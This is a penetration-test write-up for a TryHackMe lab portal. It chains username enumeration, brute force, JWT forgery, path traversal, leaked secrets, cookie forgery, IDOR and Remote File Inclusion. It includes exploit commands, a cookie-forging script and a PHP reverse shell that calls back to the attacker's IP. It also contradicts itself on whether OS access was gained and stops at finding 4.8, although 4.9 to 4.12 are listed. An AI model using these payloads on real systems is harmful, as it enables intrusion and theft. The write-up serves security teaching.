# NexusCorp Employee Portal — Vulnerability Assessment Report

- **Target:** NexusCorp Employee Portal (TryHackMe "Domino" — Jr Penetration Tester path)
- **Target IP:** `10.49.179.121`
- **Attacker IP:** `10.48.122.251` (initial recon); VPN reconnect mid-engagement moved this to `10.49.124.24`, then `10.49.120.226` for the RFI/reverse-shell phase (Findings 4.8+) — noted here since it appears directly in raw command output below
- **Assessment type:** Authenticated/unauthenticated black-box web application test, extended into OS-level post-exploitation
- **Status:** Complete — full web-app exploit chain confirmed (4.1–4.7); pivoted into OS-level access via Remote File Inclusion → RCE (4.8), identified the real mechanism behind the ticket-review "blind XSS" hypothesis as SSRF (4.9), moved laterally to the `devops` OS account via credential reuse (4.10), mapped a theoretical `root` privilege-escalation chain via `admin_bot.py` whose restart trigger was never found (4.11), and achieved **full `root` compromise** via a second, separate root-owned write primitive triggered by a cron job in root's own personal crontab (4.12). A small number of secondary threads remain unexplored; see Section 6
- **Raw notes:** `temp.md` (same folder) holds unprocessed command/output transcripts captured live during today's post-exploitation phase; this report synthesizes and structures that material into the findings below

---

## Table of Contents

- [1. Executive Summary](#1-executive-summary)
- [2. Scope and Objectives](#2-scope-and-objectives)
- [3. Reconnaissance](#3-reconnaissance)
- [4. Findings](#4-findings)
  - [4.1 Username Enumeration (CWE-203) — Low](#41-username-enumeration-cwe-203-low)
  - [4.2 Password Reuse / Weak Shared Credential (CWE-521) — Medium](#42-password-reuse-weak-shared-credential-cwe-521-medium)
  - [Post-Authentication Reconnaissance](#post-authentication-reconnaissance-as-emmataylor-role-user)
  - [4.3 JWT Signature Verification Disabled (CWE-347) — Critical](#43-jwt-signature-verification-disabled-cwe-347-critical)
  - [4.4 Local File Inclusion / Path Traversal (CWE-22) — High](#44-local-file-inclusion-path-traversal-cwe-22-high-partially-mitigated)
  - [4.5 Hardcoded Secrets in Source (CWE-798) — High](#45-hardcoded-secrets-in-source-cwe-798-high)
  - [4.6 Session Cookie Forgery → Full Administrative Impersonation (CWE-290) — Critical](#46-session-cookie-forgery-full-administrative-impersonation-cwe-290-critical)
  - [4.7 IDOR — Horizontal Privilege Escalation (CWE-639) — High](#47-idor-horizontal-privilege-escalation-cwe-639-high)
  - [4.8 Remote File Inclusion (RFI) → Remote Code Execution (CWE-98) — Critical](#48-remote-file-inclusion-rfi-remote-code-execution-cwe-98-critical)
  - [4.9 SSRF via Ticket-Review Automation (CWE-918) — Medium](#49-ssrf-via-ticket-review-automation-optadmin_botpy-cwe-918-medium)
  - [4.10 Credential Reuse — DB Password Reused as OS Password (CWE-521) — High](#410-credential-reuse-database-password-reused-as-os-account-password-cwe-521-high)
  - [4.11 World-Writable Root-Owned Automation Script (CWE-732) — High](#411-world-writable-root-owned-automation-script-optadmin_botpy-cwe-732-high-privilege-escalation-not-yet-completed)
  - [4.12 Cron-Triggered Group-Writable Script → Full Root Compromise (CWE-732) — Critical](#412-cron-triggered-group-writable-script-full-root-compromise-cwe-732-critical)
- [5. Attack Chain (Summary)](#5-attack-chain-summary)
- [6. Open Items / Not Yet Explored](#6-open-items-not-yet-explored)
- [7. Overall Recommendations](#7-overall-recommendations)
- [8. Flags Captured](#8-flags-captured)

---

## 1. Executive Summary

The NexusCorp Employee Portal is a PHP/Apache web application exposing only HTTP (80) and SSH (22). No vulnerability was found in a single component in isolation — instead, a chain of independently minor issues (information disclosure, weak credential hygiene, a disabled signature check, and a missing access-control check) combines into full administrative impersonation and cross-user data disclosure.

**Confirmed impact:** An attacker starting with zero credentials can enumerate valid usernames, brute-force a shared weak password, pivot through a broken JWT implementation to disclose the application's full PHP source and all hardcoded secrets, forge valid session cookies for any user (including the CISO), and — independently of all of that — read any other user's private profile data via a basic IDOR with nothing more than a normal low-privileged login. From an OS-level foothold, the same credential-reuse pattern that compromised the web application extends to a real operating-system account, and a second group-writable, root-executed script (distinct from the one originally suspected) provides a direct path to full `root` compromise via a cron-triggered execution window.

| #   | Finding                                                      | Severity (indicative) | CWE     |
| --- | ------------------------------------------------------------ | --------------------- | ------- |
| 1   | Username Enumeration                                         | Low                   | CWE-203 |
| 2   | Password Reuse / Weak Shared Credential                      | Medium                | CWE-521 |
| 3   | JWT Signature Verification Disabled                          | Critical              | CWE-347 |
| 4   | Local File Inclusion / Path Traversal (partially mitigated)  | High                  | CWE-22  |
| 5   | Hardcoded Secrets in Source                                  | High                  | CWE-798 |
| 6   | Session Cookie Forgery → Admin Impersonation                 | Critical              | CWE-290 |
| 7   | IDOR — Horizontal Privilege Escalation                       | High                  | CWE-639 |
| 8   | Remote File Inclusion (RFI) → Remote Code Execution          | Critical              | CWE-98  |
| 9   | SSRF via Ticket-Review Automation (`admin_bot.py`)           | Medium                | CWE-918 |
| 10  | Credential Reuse — DB Password Reused as OS Account Password | High                  | CWE-521 |
| 11  | World-Writable Root-Owned Automation Script (`admin_bot.py`) | High                  | CWE-732 |
| 12  | Cron-Triggered Group-Writable Script → Full Root Compromise  | Critical              | CWE-732 |

---

## 2. Scope and Objectives

- **In scope:** `10.49.179.121` (web app on port 80), as provisioned by the TryHackMe room.
- **Out of scope:** Any infrastructure not provisioned by the room; no destructive testing performed.
- **Objective:** Identify and chain vulnerabilities to determine the maximum achievable impact (confidentiality/integrity of user and admin data), following standard web-app methodology (recon → enumeration → vulnerability analysis → exploitation → post-exploitation).

---

## 3. Reconnaissance

```bash
nmap -sV -sC 10.49.179.121
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
```

Only two ports open. SSH had no obtainable credentials throughout the engagement (OS-level compromise was not achieved). The web application (PHP, `index.php` entrypoint) is the sole attack surface.

![NexusCorp Employee Portal login page](images/login.png)

_Login page at `10.49.179.121`. Note the `firstname.lastname` username placeholder and the "Our Team" link in the footer — both become relevant immediately below._

The portal's public **"Our Team"** page discloses 7 full names, roles, departments, and emails, directly revealing the username convention (`firstname.lastname`, `@nexus.corp`):

![NexusCorp "Our Team" page listing all 7 employees](images/our-team-page.png)

| Username      | Role                      | Department           |
| ------------- | ------------------------- | -------------------- |
| laura.hayes   | Chief Information Officer | Executive Leadership |
| michael.chen  | Lead Security Engineer    | InfoSec              |
| sarah.johnson | Senior Software Engineer  | Engineering          |
| robert.wilson | DevOps Engineer           | Infrastructure       |
| emma.taylor   | Product Manager           | Product              |
| david.brown   | Full Stack Developer      | Engineering          |
| james.wright  | Systems Administrator     | Infrastructure       |

This single page is the seed for every subsequent step: it converts a blind credential-guessing problem into a targeted one against 7 known accounts.

---

## 4. Findings

### 4.1 Username Enumeration (CWE-203) — Low

**Location:** `/forgot.php` (POST, `username` parameter)

**Description:** The login form (`index.php`) returns a generic `"Invalid credentials"` for any bad username/password combination and does not leak account existence. The password-reset flow at `/forgot.php`, however, returns different responses depending on whether the submitted username exists:

- Unknown username → `"No account found with that username."`
- Known username → `"Password reset instructions have been sent to <masked-email>"`

```
POST /forgot.php  username=nobody.here
→ "No account found with that username."

POST /forgot.php  username=laura.hayes
→ "Password reset instructions have been sent to la****@nexus.corp"
```

No CSRF token was observed on the `/forgot.php` POST either.

**Impact:** Allows an attacker to confirm which of the 7 names from the "Our Team" page map to real accounts, without any credential guessing. Combined with no observed rate-limiting or lockout, this is a low-cost, high-confidence oracle.

**Remediation:** Return an identical, generic response regardless of whether the account exists; rate-limit the endpoint regardless.

---

### 4.2 Password Reuse / Weak Shared Credential (CWE-521) — Medium

**Testing approach:** Hydra against the confirmed username list, `10-million-password-list-top-1000.txt`, with request spacing to avoid triggering any lockout (none was observed throughout).

```
hydra -L usernames.txt -P 10-million-password-list-top-1000.txt 10.49.179.121 \
  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials" -t 4
```

**Result:** 3 of 7 accounts shared the literal password `password`:

- `sarah.johnson : password`
- `robert.wilson : password`
- `emma.taylor : password`

Notably, the CISO, Lead Security Engineer, Full-Stack Developer, and SysAdmin accounts did **not** fall to this list — only the three less security-focused roles reused a trivially weak password.

**Impact:** Initial authenticated foothold (low-privilege `user` role) with zero exploitation required — a pure credential-hygiene failure.

**Remediation:** Enforce a minimum password strength/entropy policy and screen against common-password lists at account creation/change time; consider MFA for all roles.

---

### Post-Authentication Reconnaissance (as emma.taylor, role: user)

Before touching any API directly, the dashboard UI was walked manually to map the attack surface. It exposes: **My Profile** (username/email/role), a **File Viewer** at `/api/files.php?name=` ("Access internal documents via the secure file API"), **JWT auth** at `/api/auth/token.php`, and **Quick Links** to Support Tickets, Open Ticket, and the Profile API.

![Dashboard after logging in as emma.taylor](images/emma-taylor-dashboard.png)

![Support Tickets page](images/support-tickets.png)

![Open Ticket page](images/open-ticket.png)

---

### 4.3 JWT Signature Verification Disabled (CWE-347) — Critical

**Location:** `verify_jwt()` in `auth.php`, consumed by `/api/files.php`

**Description:** The dashboard's "File Viewer" is gated by a JWT, fetched from `/api/auth/token.php`:

```json
GET /api/auth/token.php

{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbW1hLnRheWxvciIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkzMTExMDgwLCJleHAiOjE3OTMxMTQ2ODB9.E09V9wiSlx88skw/b1Ild+7ydX5h2y190S0VKUR8wos",
  "expires_in": 3600,
  "note": "Use this token as: Authorization: Bearer <token> for /api/files.php"
}
```

A JWT is `header.payload.signature`; header and payload are only base64url-_encoded_, not encrypted, so each part was decoded locally to see exactly what the server trusts — without touching the signing secret:

```bash
echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo -n "eyJzdWIiOiJlbW1hLnRheWxvciIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzkzMTExMDgwLCJleHAiOjE3OTMxMTQ2ODB9" | base64 -d
# {"sub":"emma.taylor","role":"user","iat":1793111080,"exp":1793114680}
```

The `role` claim lives directly in the payload — readable, and potentially editable client-side if the server doesn't actually verify the signature on the way back in. A second JWT was grabbed for `robert.wilson` and used as a legitimate, non-admin baseline first:

```
$ curl -s "http://10.49.179.121/api/files.php?name=robert" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTMxMTE2MjAsImV4cCI6MTc5MzExNTIyMH0.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc" -v
...
< HTTP/1.1 403 Forbidden
< Content-Type: application/json
<
{"error":"Admin JWT required. Check your token payload."}
```

This confirms the endpoint gates on the JWT's `role` claim specifically. Since nothing in that response implies the signature is actually checked, the hypothesis was tested directly: the payload's `role` was changed to `admin`, re-encoded, and reattached to the **original, now-mismatched** signature, unchanged:

```php
# Tampered payload (base64-decoded, for reference)
{"alg":"HS256","typ":"JWT"}{"sub":"robert.wilson","role":"admin","iat":1793111620,"exp":1793115220}
```

```
$ curl -s "http://10.49.179.121/api/files.php?name=robert" \
    -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc" -v
...
< HTTP/1.1 403 Forbidden
< Content-Type: application/json
<
{"error":"Access denied: path must be within \/var\/www\/html\/"}
```

**Accepted** — the forged `role: admin` claim was honored despite the mismatched signature, confirming the signature is not verified server-side at all. This is also the root cause behind Finding 4.4: a _new_, different error now surfaces (a path-containment message), showing the `name=` parameter is now reachable and builds a filesystem path server-side.

Source disclosure (via Finding 4.4) later confirmed the root cause directly: `verify_jwt()`'s entire signature-comparison block is commented out; only token expiry (`exp`) is checked.

```php
function verify_jwt($token) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    $payload = json_decode(base64_decode($parts[1]), true);
    if (!$payload) return null;
    // Signature check intentionally disabled
    // $expected = rtrim(base64_encode(hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)),'=');
    // if (!hash_equals($parts[2], $expected)) return null;
    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
```

A secondary bug in `generate_jwt()` always issues `role: 'user'` regardless of the account's real DB role — meaning even a legitimate admin login would not normally receive an admin-role JWT. This made client-side forgery the only practical way to obtain an "admin" JWT at all.

**Impact:** Trivial, unauthenticated-strength privilege escalation on any endpoint gating by JWT role claims — any authenticated user of any role can mint themselves an "admin" JWT.

**Remediation:** Re-enable and enforce HMAC signature verification using `hash_equals()`; never trust unverified claims for authorization decisions.

---

### 4.4 Local File Inclusion / Path Traversal (CWE-22) — High (partially mitigated)

**Location:** `/api/files.php?name=` (reachable once a JWT carries `role: admin`, per 4.3)

**Description:** With the forged admin-role JWT, `?name=robert` returned a new error: `"Access denied: path must be within /var/www/html/"` — confirming the `name` parameter is concatenated into a filesystem path. Direct traversal toward `/etc/passwd` (`../../../../etc/passwd`, with and without a redundant `/var/www/html/` prefix) was correctly blocked with the same error — the containment check appears to normalize the resolved path (consistent with `realpath()`) rather than doing a naive string-prefix match, so it is **not** trivially bypassable for escaping the web root.

However, requesting a known in-bounds file (`?name=index.php`) returned:

```
$ curl -s "http://10.49.179.121/api/files.php?name=index.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
< HTTP/1.1 200 OK
< Content-Type: application/json
<
{"file":"\/var\/www\/html\/api\/index.php","content":"  "}
```

This revealed the _actual_ working directory is `/var/www/html/api/` — one level deeper than the error message implies (`/var/www/html/`). A single relative `../` therefore reaches sibling files one level up, which remain "within" the permitted root from the check's perspective. `forgot.php` was tried first, since it was already a known endpoint from Finding 4.1:

```
$ curl -s "http://10.49.179.121/api/files.php?name=../forgot.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
< HTTP/1.1 200 OK
{"file":"\/var\/www\/html\/forgot.php","content":"<?php\n ... "}
```

```php
<?php
require_once __DIR__ . '/auth.php';

$msg = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');

    if ($username) {
        $db = get_db();

        $stmt = $db->prepare(
            'SELECT id, username, email, role FROM users WHERE username = ?'
        );
        $stmt->execute([$username]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$row) {
            // Username enumeration: different message for unknown user
            $error = 'No account found with that username.';
        } elseif ($row['role'] === 'admin') {
            // Fix A: admin accounts never get a token, show email-sent message
            $masked = substr($row['email'], 0, 2)
                . str_repeat('*', 4)
                . substr($row['email'], strpos($row['email'], '@'));

            $msg = "Password reset instructions have been sent to $masked";
        } else {
            // Regular users: generate token and store
            // (token NOT bound to requesting user - logic flaw)
            $token = bin2hex(random_bytes(16));

            $db->prepare(
                'DELETE FROM reset_tokens WHERE user_id = ?'
            )->execute([$row['id']]);

            $db->prepare(
                'INSERT INTO reset_tokens (token, user_id) VALUES (?, ?)'
            )->execute([$token, $row['id']]);

            $msg = "Reset link sent. Check your email for instructions.";
        }
    }
}
?>
```

The dev comment "`token NOT bound to requesting user - logic flaw`" is a separate, not-yet-chased thread (see Section 6). `forgot.php` itself `require_once`s `auth.php`, which was read next:

```bash
$ curl -s "http://10.49.179.121/api/files.php?name=../auth.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
< HTTP/1.1 200 OK
{"file":"\/var\/www\/html\/auth.php","content":"<?php\n ... "}
```

```php
<?php
require_once __DIR__ . '/config.php';

function get_session() {
    if (!isset($_COOKIE['nexus_session'])) return null;

    $raw = $_COOKIE['nexus_session'];

    // Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)
    $parts = explode('.', $raw, 2);
    if (count($parts) !== 2) return null;

    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);
    if (!hash_equals($expected_sig, $parts[1])) return null;

    $decoded = base64_decode($parts[0]);
    $data = json_decode($decoded, true);

    if (!$data || !isset($data['user_id'])) return null;

    // Role always fetched from DB - cookie role value ignored
    $db = get_db();
    $stmt = $db->prepare(
        'SELECT id, username, email, role FROM users WHERE id = ?'
    );
    $stmt->execute([$data['user_id']]);

    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function require_login() {
    $user = get_session();

    if (!$user) {
        header('Location: /index.php');
        exit;
    }

    return $user;
}

function require_admin() {
    $user = require_login();

    if ($user['role'] !== 'admin') {
        http_response_code(403);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Forbidden']);
        exit;
    }

    return $user;
}

function generate_jwt($username) {
    $header = rtrim(
        base64_encode(json_encode(['alg' => 'HS256', 'typ' => 'JWT'])),
        '='
    );

    // Bug: role always set to "user" regardless of actual user role
    $payload = rtrim(base64_encode(json_encode([
        'sub' => $username,
        'role' => 'user',
        'iat' => time(),
        'exp' => time() + 3600
    ])), '=');

    $sig = rtrim(
        base64_encode(
            hash_hmac('sha256', "$header.$payload", JWT_SECRET, true)
        ),
        '='
    );

    return "$header.$payload.$sig";
}

function verify_jwt($token) {
    $parts = explode('.', $token);

    if (count($parts) !== 3) return null;

    $payload = json_decode(base64_decode($parts[1]), true);

    if (!$payload) return null;

    // Signature check intentionally disabled
    // $expected = rtrim(base64_encode(hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)),'=');
    // if (!hash_equals($parts[2], $expected)) return null;

    if (isset($payload['exp']) && $payload['exp'] < time()) return null;

    return $payload;
}
?>
```

This is the direct source confirmation of Finding 4.3 (the commented-out signature check) and also shows that `auth.php` itself `require_once`s `config.php`, which almost certainly holds DB credentials and signing secrets — read next in Finding 4.5.

**Impact:** Full source-code disclosure for every file sitting one directory above the API, including the application's authentication logic and its configuration file — the pivot point for Finding 4.5.

**Remediation:** Validate `name` against an explicit allow-list of permitted filenames rather than path-normalizing user input; never serve arbitrary file reads from a user-controlled parameter at all.

---

### 4.5 Hardcoded Secrets in Source (CWE-798) — High

**Location:** `config.php`, disclosed via Finding 4.4

```
$ curl -s "http://10.49.179.121/api/files.php?name=../config.php" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
< HTTP/1.1 200 OK
{"file":"\/var\/www\/html\/config.php","content":"<?php\n ... "}
```

```php
<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');

function get_db() {
    $pdo = new PDO(
        'mysql:host=' . DB_HOST . ';dbname=' . DB_NAME,
        DB_USER,
        DB_PASS
    );

    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    return $pdo;
}
?>
```

**Description:** `DB_PASS` and `JWT_SECRET` relate to the already-broken JWT path. `APP_SECRET`, however, signs an entirely **separate**, independently well-implemented mechanism discovered by reading `auth.php`: the `nexus_session` cookie.

```php
function get_session() {
    ...
    $parts = explode('.', $raw, 2);
    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);
    if (!hash_equals($expected_sig, $parts[1])) return null;
    ...
    // Role always fetched fresh from DB — cookie's own role value is ignored
    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');
    $stmt->execute([$data['user_id']]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}
```

This cookie scheme is sound in isolation (HMAC-verified with `hash_equals`, role never trusted from client input). It is only exploitable as a downstream consequence of the secret leaking through Finding 4.4.

Note for reproduction: the two HMAC usages in this codebase encode differently — `generate_jwt()` uses `hash_hmac(..., true)` (raw bytes, base64-encoded), while `get_session()` uses `hash_hmac(...)` with no third argument (hex digest). A forgery script must match the hex-digest form for the cookie.

**Impact:** Database credentials and both signing secrets fully compromised; DB itself not directly reachable (MySQL port not exposed per nmap), but the leaked `APP_SECRET` is sufficient to forge valid application sessions (Finding 4.6).

**Remediation:** Move all secrets out of source into environment variables or a secrets manager not reachable via any web-exposed file-read path; rotate all three secrets.

---

### 4.6 Session Cookie Forgery → Full Administrative Impersonation (CWE-290) — Critical

**Description:** Using the leaked `APP_SECRET`, a valid `nexus_session` cookie was forged for `user_id=1` (`laura.hayes`, CISO):

```python
import hmac, hashlib, base64, json

secret = "nexus_app_k3y_2024"
user_id = 1

payload = base64.b64encode(json.dumps({"user_id": user_id}).encode()).decode()
sig = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()
cookie = f"{payload}.{sig}"

print(cookie)
```

```bash
$ curl -s http://10.49.179.121/dashboard.php -H "Cookie: nexus_session=eyJ1c2VyX2lkIjogMX0=.18774129655cf93459b228dfb1d4f0bedc37ab6e685747136c1da9c8104d6459" -v
*   Trying 10.49.179.121:80...
* Connected to 10.49.179.121 (10.49.179.121) port 80
> GET /dashboard.php HTTP/1.1
> Host: 10.49.179.121
> Cookie: nexus_session=eyJ1c2VyX2lkIjogMX0=.18774129655cf93459b228dfb1d4f0bedc37ab6e685747136c1da9c8104d6459
>
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=UTF-8
<
<h1>Welcome, laura.hayes</h1>
...
<p><strong>Role:</strong> admin</p>
...
<a href="/admin/index.php">Admin</a>
...
<li><a href="/api/users/profile.php?id=1">My Profile API</a></li>
```

**Result:** `200 OK`, rendered dashboard for `laura.hayes`, `Role: admin`. The navigation bar now exposed an `/admin/index.php` link not shown to regular users, plus `/api/users/profile.php?id=1` ("My Profile API").

![Forged nexus_session cookie accepted by dashboard.php, inspected via browser DevTools Storage panel](images/admin-dashboard.png)

Following the newly-exposed `Admin` nav link confirmed full administrative access on the live application:

![/admin/index.php — Administration Console, logged in as laura.hayes](images/admin-console.png)

**Impact:** Full impersonation of the organization's CISO account on the live application, no password or MFA required — direct consequence of Finding 4.5. The admin console exposes a "User Management" view-user-API shortcut, a documented `/api/files.php?name=` file-access endpoint, and a support-ticket queue — all now reachable as an administrator (see Section 6 for what remains unexplored there).

**Remediation:** Same as 4.5 (secret rotation/isolation); additionally consider binding sessions to something not reconstructable from a single leaked static secret (e.g., server-side session storage rather than a stateless HMAC cookie signed by one long-lived key).

---

### 4.7 IDOR — Horizontal Privilege Escalation (CWE-639) — High

**Location:** `/api/users/profile.php?id=`

**Description:** This finding is **independent** of the admin-impersonation chain above. While authenticated as `robert.wilson` via a completely ordinary password login (role: `user` — the forged admin cookie was not involved at all), requesting `?id=1` returned Laura Hayes's **full profile**, including a `notes` field not shown to her in her own UI, confirming the record has no visibility restriction based on sensitivity.

```
GET /api/users/profile.php?id=1
(session: robert.wilson, role: user — plain password login, no forged cookie/JWT)
```

![/api/users/profile.php?id=1 returning laura.hayes's full record, including the normally-hidden `notes` field, to a logged-in robert.wilson session](images/admin-profile.png)

**Captured:** the `notes` field in this response contains `THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}`.

**Impact:** Any authenticated user, regardless of role, can read any other user's full profile record by incrementing/guessing the `id` parameter — a textbook horizontal access-control failure. This is reachable by the lowest-privilege account compromised in Finding 4.2 alone; none of Findings 4.3–4.6 are prerequisites.

**Remediation:** Enforce server-side authorization on every object access — verify the requesting session's `user_id` matches the requested `id`, or that the requester holds an explicit admin role, before returning the record.

---

### 4.8 Remote File Inclusion (RFI) → Remote Code Execution (CWE-98) — Critical

**Location:** `/api/files.php?name=` (same endpoint as Finding 4.4, reachable with a forged admin-role JWT)

**Description:** Finding 4.4 established that the `name` parameter is containment-checked against `/var/www/html/` using what behaves like a `realpath()`-based normalization — effective against `../`-style traversal. That check assumes a **local filesystem path**. It does not account for a fully-qualified remote URL, which `realpath()` cannot resolve at all (and therefore does not reject the way it rejects a local out-of-bounds path).

First, confirmed the request even reaches a remote listener at all, using an innocuous static file as a low-risk probe:

```bash
python3 -m http.server 8000   # attacker box, serving index.html
```

```bash
curl -s "http://10.49.179.121/api/files.php?name=http://10.49.120.226:8000/index.html" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

```
# listener log:
10.49.179.121 - - [29/Oct/2026 14:23:39] "GET /index.html HTTP/1.1" 200 -
```

The containment check does **not** block the URL — the target reached out and fetched it. A static HTML file looks identical whether it was merely _read_ or actually _included/executed_, so a differentiating payload was needed next:

```php
<?php echo "RCE-TEST-" . (1337*2); ?>
```

```bash
curl -s "http://10.49.179.121/api/files.php?name=http://10.49.120.226:8000/exploit.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

```json
{ "output": "RCE-TEST-2674" }
```

`1337*2` evaluated server-side to `2674` — confirmed PHP code execution, not a file read (note also the JSON key changed to `"output"`, distinct from the `"file"`/`"content"` shape returned for local-path reads in Finding 4.4, implying a dedicated code path for the remote-URL case). Verified actual OS command execution next, since some hardened PHP builds disable `system()`/`exec()`/`shell_exec()` individually via `disable_functions`:

```php
<?php system('id'); ?>
```

```bash
curl -s "http://10.49.179.121/api/files.php?name=http://10.49.120.226:8000/exploit.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyb2JlcnQud2lsc29uIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzkzMTExNjIwLCJleHAiOjE3OTMxMTUyMjB9.2AAq07/tbAhLshTj6yyHO8Wx9E5kH9VxOC5LHfq8YNc"
```

```json
{ "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n" }
```

Confirmed OS command execution as `www-data`. Escalated to an interactive shell using a standard PentestMonkey PHP reverse shell (IP/port edited to point at the attacker box), delivered via the same RFI primitive:

```bash
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 10.49.120.226
```

```bash
sed -i "s/\$ip = '127.0.0.1';/\$ip = '10.49.86.77';/" /usr/share/webshells/php/php-reverse-shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" /usr/share/webshells/php/php-reverse-shell.php

sed -i "s/\$ip = '10.49.86.77';/\$ip = '10.49.120.226';/" /usr/share/webshells/php/php-reverse-shell.php
sed -i "s/\$port = 1234;/\$port = 4444;/" /usr/share/webshells/php/php-reverse-shell.php

grep -n '\$ip\|\$port' /usr/share/webshells/php/php-reverse-shell.php

curl -s "http://10.49.179.121/api/files.php?name=http://10.49.120.226:8000/php-reverse-shell.php" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5MzM2NjE5MiwiZXhwIjoxNzkzMzY5NzkyfQ.JW9ZpXPq+hcnSSiPh9HIYiOV835llJStXjWp/McvxzA"
```

```bash
listening on [any] 4444 ...
connect to [10.49.120.226] from (UNKNOWN) [10.49.179.121] 39894
Linux tryhackme-2404 6.17.0-1015-aws #15~24.04.1-Ubuntu SMP Thu May 7 17:00:14 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

(Shell later re-established via [Penelope](https://github.com/brightio/penelope) for a more stable, fully-interactive session with built-in upload/download support, used for the remainder of the engagement.)

**Captured on first shell access:**

```bash
$ cat /opt/flag3.txt
THM{rf1_2_rc3_f00th0ld_fl4g3}
```

**Note:** `files.php`'s own source was never actually pulled during this engagement (it would have definitively shown whether the remote-URL branch uses `include()`/`allow_url_include`, or a different mechanism entirely such as downloading to a temp path and executing it separately) — flagged as an open documentation gap in Section 6.

**Impact:** Unauthenticated-strength (admin-JWT forgery only, no OS credentials) remote code execution as `www-data`, the actual root cause for OS-level compromise of this host.

